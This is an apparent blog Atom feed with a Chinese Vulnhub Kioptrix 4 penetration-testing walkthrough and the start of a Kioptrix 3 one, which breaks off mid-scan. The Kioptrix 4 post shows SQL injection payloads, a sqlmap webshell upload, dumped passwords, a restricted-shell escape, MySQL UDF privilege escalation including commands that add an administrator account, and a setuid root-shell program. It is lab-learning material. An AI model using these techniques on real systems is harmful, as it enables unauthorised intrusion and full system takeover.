<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Uknow - Stay hungry Stay foolish</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://uknowsec.cn/"/>
  <updated>2018-05-17T07:59:07.261Z</updated>
  <id>https://uknowsec.cn/</id>
  
  <author>
    <name>uknow</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vulnhub渗透测试练习-Kioptrix 4</title>
    <link href="https://uknowsec.cn/posts/uncategorized/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Kioptrix-4.html"/>
    <id>https://uknowsec.cn/posts/uncategorized/Vulnhub渗透测试练习-Kioptrix-4.html</id>
    <published>2018-05-17T05:46:30.000Z</published>
    <updated>2018-05-17T07:59:07.261Z</updated>
    
    <content type="html"><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>用<code>nmap</code>进行端口扫描。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sS -A 10.32.58.187</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 01:57 EDT</span><br><span class="line">Nmap scan report for 10.32.58.187</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">Not shown: 566 closed ports, 430 filtered ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)</span><br><span class="line">|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html).</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 00:0C:29:38:2D:6F (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 10h00m00s, deviation: 2h49m43s, median: 7h59m59s</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 3.0.28a)</span><br><span class="line">|   Computer name: Kioptrix4</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: localdomain</span><br><span class="line">|   FQDN: Kioptrix4.localdomain</span><br><span class="line">|_  System time: 2018-05-17T09:58:07-04:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.37 ms 10.32.58.187</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.81 seconds</span><br></pre></td></tr></table></figure><p>从扫描结果可以得到，开发以下端口信息</p><ul><li>22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</li><li>80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</li><li>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</li><li>445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)</li></ul><p>访问80端口下的WEB服务。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix4_1.png" alt=""></p><p>尝试万能密码绕过<code>&#39;or 1=1#</code> 绕过失败。</p><p>弱密码<code>admin:admin</code>也是错误的。</p><p>尝试<code>admin:&#39;</code>，出现报错。好爆出来了路径<code>/var/www/checklogin.php</code>。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix4_2.png" alt=""></p><p>存在POST型注入。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="sqlmap进行SQL注入"><a href="#sqlmap进行SQL注入" class="headerlink" title="sqlmap进行SQL注入"></a>sqlmap进行SQL注入</h3><p><code>sqlmap -u http://10.32.58.187/checklogin.php --data=&quot;myusername=admin&amp;mypassword=123&amp;Submit=Login&quot; -p mypassword --current-user --current-db --is-dba</code></p><p>在注入的过程会遇到<code>302跳转</code>选择<code>n</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 253 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: mypassword (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=-8260&apos; OR 6555=6555#&amp;Submit=Login</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123&apos; OR SLEEP(5)-- UeQF&amp;Submit=Login</span><br><span class="line">---</span><br><span class="line">[02:00:45] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span><br><span class="line">web application technology: PHP 5.2.4, Apache 2.2.8</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[02:00:45] [INFO] fetching current user</span><br><span class="line">[02:00:45] [WARNING] running in a single-thread mode. Please consider usage of option &apos;--threads&apos; for faster data retrieval</span><br><span class="line">[02:00:45] [INFO] retrieved: root@localhost</span><br><span class="line">current user:    &apos;root@localhost&apos;</span><br><span class="line">[02:00:45] [INFO] fetching current database</span><br><span class="line">[02:00:45] [INFO] retrieved: members</span><br><span class="line">current database:    &apos;members&apos;</span><br><span class="line">[02:00:45] [INFO] testing if current user is DBA</span><br><span class="line">[02:00:45] [INFO] fetching current user</span><br><span class="line">current user is DBA:    True</span><br><span class="line">[02:00:45] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/10.32.58.187&apos;</span><br><span class="line"></span><br><span class="line">[*] shutting down at 02:00:45</span><br></pre></td></tr></table></figure><p>通过注入得到用户名和密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: members</span><br><span class="line">Table: members</span><br><span class="line">[2 entries]</span><br><span class="line">+----+----------+-----------------------+</span><br><span class="line">| id | username | password              |</span><br><span class="line">+----+----------+-----------------------+</span><br><span class="line">| 1  | john     | MyNameIsJohn          |</span><br><span class="line">| 2  | robert   | ADGAdsafdfwt4gadfga== |</span><br><span class="line">+----+----------+-----------------------+</span><br></pre></td></tr></table></figure><p>通过<code>--os-shell</code>写入一个<code>webshell</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u http://10.32.58.187/checklogin.php --data=&quot;myusername=admin&amp;mypassword=123&amp;Submit=Login&quot; -p mypassword --os-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[&apos;]_____ ___ ___  &#123;1.2.4#stable&#125;</span><br><span class="line">|_ -| . [.]     | .&apos;| . |</span><br><span class="line">|___|_  [(]_|_|_|__,|  _|</span><br><span class="line">      |_|V          |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting at 02:09:06</span><br><span class="line"></span><br><span class="line">[02:09:06] [INFO] resuming back-end DBMS &apos;mysql&apos; </span><br><span class="line">[02:09:06] [INFO] testing connection to the target URL</span><br><span class="line">[02:09:06] [INFO] heuristics detected web page charset &apos;ascii&apos;</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: mypassword (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=-8260&apos; OR 6555=6555#&amp;Submit=Login</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind</span><br><span class="line">    Payload: myusername=admin&amp;mypassword=123&apos; OR SLEEP(5)-- UeQF&amp;Submit=Login</span><br><span class="line">---</span><br><span class="line">[02:09:06] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span><br><span class="line">web application technology: PHP 5.2.4, Apache 2.2.8</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[02:09:06] [INFO] going to use a web backdoor for command prompt</span><br><span class="line">[02:09:06] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class="line">[02:09:06] [INFO] the back-end DBMS operating system is Linux</span><br><span class="line">which web application language does the web server support?</span><br><span class="line">[1] ASP</span><br><span class="line">[2] ASPX</span><br><span class="line">[3] JSP</span><br><span class="line">[4] PHP (default)</span><br><span class="line">&gt; 4</span><br><span class="line">[02:09:08] [INFO] retrieved the web server document root: &apos;/var/www&apos;</span><br><span class="line">[02:09:08] [INFO] retrieved web server absolute paths: &apos;/var/www/checklogin.php&apos;</span><br><span class="line">[02:09:08] [INFO] trying to upload the file stager on &apos;/var/www/&apos; via LIMIT &apos;LINES TERMINATED BY&apos; method</span><br><span class="line">[02:09:08] [INFO] the file stager has been successfully uploaded on &apos;/var/www/&apos; - http://10.32.58.187:80/tmpuadle.php</span><br><span class="line">[02:09:08] [WARNING] unable to upload the file through the web file stager to &apos;/var/www/&apos;</span><br><span class="line">[02:09:08] [WARNING] backdoor has not been successfully uploaded through the file stager possibly because the user running the web server process has not write privileges over the folder where the user running the DBMS process was able to upload the file stager or because the DBMS and web server sit on different servers</span><br><span class="line">do you want to try the same method used for the file stager? [Y/n] </span><br><span class="line">[02:09:09] [INFO] the backdoor has been successfully uploaded on &apos;/var/www/&apos; - http://10.32.58.187:80/tmpbcphh.php</span><br><span class="line">[02:09:09] [INFO] calling OS shell. To quit type &apos;x&apos; or &apos;q&apos; and press ENTER</span><br><span class="line">os-shell&gt; id</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] </span><br><span class="line">command standard output:    &apos;uid=33(www-data) gid=33(www-data) groups=33(www-data)&apos;</span><br><span class="line">os-shell&gt; whoami</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] </span><br><span class="line">command standard output:    &apos;www-data&apos;</span><br><span class="line">os-shell&gt; cat checklogin.php</span><br><span class="line">do you want to retrieve the command standard output? [Y/n/a] </span><br><span class="line">command standard output:</span><br><span class="line">---</span><br><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">$host=&quot;localhost&quot;; // Host name</span><br><span class="line">$username=&quot;root&quot;; // Mysql username</span><br><span class="line">$password=&quot;&quot;; // Mysql password</span><br><span class="line">$db_name=&quot;members&quot;; // Database name</span><br><span class="line">$tbl_name=&quot;members&quot;; // Table name</span><br></pre></td></tr></table></figure><p>但是权限很小。但是得到了数据库的账号密码。</p><h3 id="通过SSH连接"><a href="#通过SSH连接" class="headerlink" title="通过SSH连接"></a>通过SSH连接</h3><p>利用SQL注入得到的用户名密码SSH登录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh john@10.32.58.187</span><br><span class="line">The authenticity of host &apos;10.32.58.187 (10.32.58.187)&apos; can&apos;t be established.</span><br><span class="line">RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &apos;10.32.58.187&apos; (RSA) to the list of known hosts.</span><br><span class="line">john@10.32.58.187&apos;s password: </span><br><span class="line">Welcome to LigGoat Security Systems - We are Watching</span><br><span class="line">== Welcome LigGoat Employee ==</span><br><span class="line">LigGoat Shell is in place so you  don&apos;t screw up</span><br><span class="line">Type &apos;?&apos; or &apos;help&apos; to get the list of allowed commands</span><br><span class="line">john:~$ id</span><br><span class="line">*** unknown command: id</span><br><span class="line">john:~$ ?</span><br><span class="line">cd  clear  echo  exit  help  ll  lpath  ls</span><br><span class="line">john:~$ help help</span><br><span class="line">Limited Shell (lshell) limited help.</span><br><span class="line">Cheers.</span><br></pre></td></tr></table></figure><p>从这里我们可以利用的命令有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd  clear  echo  exit  help  ll  lpath  ls</span><br></pre></td></tr></table></figure><p>重点其中有一个是<code>echo</code>。</p><p>我们可以利用他得到一个<code>bash交互shell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john:~$ echo os.system(&apos;/bin/bash&apos;)     </span><br><span class="line">john@Kioptrix4:~$ id</span><br><span class="line">uid=1001(john) gid=1001(john) groups=1001(john)</span><br></pre></td></tr></table></figure><p>权限还是当前用户的权限。</p><h3 id="MySQL数据库提权"><a href="#MySQL数据库提权" class="headerlink" title="MySQL数据库提权"></a>MySQL数据库提权</h3><p>利用SQL注入得到的数据库账号密码登录MySQL数据库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:~$ mysql -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3520</span><br><span class="line">Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the buffer.</span><br><span class="line"></span><br><span class="line">mysql&gt; status;</span><br><span class="line">--------------</span><br><span class="line">mysql  Ver 14.12 Distrib 5.0.51a, for debian-linux-gnu (i486) using readline 5.2</span><br><span class="line"></span><br><span class="line">Connection id:3520</span><br><span class="line">Current database:</span><br><span class="line">Current user:root@localhost</span><br><span class="line">SSL:Not in use</span><br><span class="line">Current pager:stdout</span><br><span class="line">Using outfile:&apos;&apos;</span><br><span class="line">Using delimiter:;</span><br><span class="line">Server version:5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line">Protocol version:10</span><br><span class="line">Connection:Localhost via UNIX socket</span><br><span class="line">Server characterset:latin1</span><br><span class="line">Db     characterset:latin1</span><br><span class="line">Client characterset:latin1</span><br><span class="line">Conn.  characterset:latin1</span><br><span class="line">UNIX socket:/var/run/mysqld/mysqld.sock</span><br><span class="line">Uptime:1 hour 10 min 47 sec</span><br></pre></td></tr></table></figure><p>尝试<code>mysql udf 提权</code>。</p><p>在Windows环境下，执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USE mysql;</span><br><span class="line">CREATE TABLE npn(line blob);</span><br><span class="line">INSERT INTO npn values(load_file(&apos;C://xampplite//htdocs//mail//lib_mysqludf_sys.dll&apos;));</span><br><span class="line">SELECT * FROM mysql.npn INTO DUMPFILE &apos;c://windows//system32//lib_mysqludf_sys_32.dll&apos;;</span><br><span class="line">CREATE FUNCTION sys_exec RETURNS integer SONAME &apos;lib_mysqludf_sys_32.dll&apos;;</span><br><span class="line">SELECT sys_exec(&quot;net user npn npn12345678 /add&quot;);</span><br><span class="line">SELECT sys_exec(&quot;net localgroup Administrators npn /add&quot;);</span><br></pre></td></tr></table></figure></p><p>实现提权。</p><p>我们在实验环境下进行Linux环境下的UDF提权操作。</p><p>首先找到<code>lib_mysqludf_sys.so</code>的目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:~$ whereis lib_mysqludf_sys.so</span><br><span class="line">lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create function sys_exec returns integer soname &apos;lib_mysqludf_sys.so&apos;;</span><br><span class="line">ERROR 1125 (HY000): Function &apos;sys_exec&apos; already exists</span><br><span class="line">mysql&gt; select sys_exec(&apos;id &gt; /tmp/out; chown john.john /tmp/out&apos;);</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    1</span><br><span class="line">Current database: mysql</span><br><span class="line"></span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| sys_exec(&apos;id &gt; /tmp/out; chown john.john /tmp/out&apos;) |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| NULL                                                | </span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; quit</span><br><span class="line">Bye</span><br><span class="line">john@Kioptrix4:~$ cat /tmp/out</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure><p>这样就将<code>sys_exec()</code>函数执行的结果写入到了<code>/tmp/out</code>下。</p><p>得知可以得到root权限。</p><p>可以写一个c语言程序进行命令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">setuid(0); setgid(0); system(“/bin/bash”);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地编译上传到目标靶机。</p><p>这里我用wget下载好像一下连接超时。可能是防火墙阻止流量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT sys_exec(&apos;usermod -a -G admin&apos;);</span><br><span class="line">ERROR 2013 (HY000): Lost connection to MySQL server during query</span><br><span class="line">mysql&gt; SELECT sys_exec(&apos;usermod -a -G admin john&apos;);</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    1</span><br><span class="line">Current database: mysql</span><br><span class="line"></span><br><span class="line">+--------------------------------------+</span><br><span class="line">| sys_exec(&apos;usermod -a -G admin john&apos;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| NULL                                 | </span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.07 sec)</span><br></pre></td></tr></table></figure><p>利用<code>SELECT sys_exec(&#39;usermod -a -G admin&#39;);</code>将<code>john</code>加入管理员组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:/tmp$ sudo su</span><br><span class="line">[sudo] password for john: </span><br><span class="line">root@Kioptrix4:/tmp# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@Kioptrix4:/tmp# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>这样我们得到了root权限。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h3&gt;&lt;p&gt;用&lt;code&gt;nmap&lt;/code&gt;进行端口扫描。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub渗透测试练习-Kioptrix 3</title>
    <link href="https://uknowsec.cn/posts/notes/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Kioptrix-3.html"/>
    <id>https://uknowsec.cn/posts/notes/Vulnhub渗透测试练习-Kioptrix-3.html</id>
    <published>2018-05-08T12:01:26.000Z</published>
    <updated>2018-05-08T17:11:29.892Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>同样用<code>netdiscover</code>发现目标主机。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# netdiscover </span><br><span class="line"></span><br><span class="line"> Currently scanning: 192.168.194.0/16   |   Screen View: Unique Hosts          </span><br><span class="line">                                                                               </span><br><span class="line"> 13 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 780              </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.43.1    ac:c1:ee:31:3f:25      6     360  Xiaomi Communications Co Ltd</span><br><span class="line"> 192.168.43.33   44:03:2c:68:d8:0f      2     120  Intel Corporate             </span><br><span class="line"> 192.168.43.58   00:0c:29:b2:76:40      4     240  VMware, Inc.                </span><br><span class="line"> 192.168.43.158  00:0c:29:38:2d:6f      1      60  VMware, Inc.</span><br></pre></td></tr></table></figure><p>目标IP为<code>192.168.43.158</code>。</p><p>用nmap扫描目标主机端口信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -A -sS -n 192.168.43.158</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-08 07:45 EDT</span><br><span class="line">Nmap scan report for 192.168.43.158</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line">Not shown: 998 closed 